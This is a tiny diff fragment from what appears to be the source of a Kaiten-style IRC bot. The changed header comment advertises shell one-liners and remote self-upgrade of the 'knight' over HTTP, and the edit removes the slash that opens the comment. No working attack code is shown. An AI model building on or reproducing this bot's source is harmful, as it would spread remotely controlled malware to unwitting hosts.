@@ -1,4 +1,4 @@
-/*******************************************************************************
+*******************************************************************************
  * This is a remake of Kaiten, hacked together from various versions scattered *
  * throughout cyberspace. New features include a variety of awesome shell one- *
  * liners, ability to upgrade the knight over http (via gcc or static binary), *
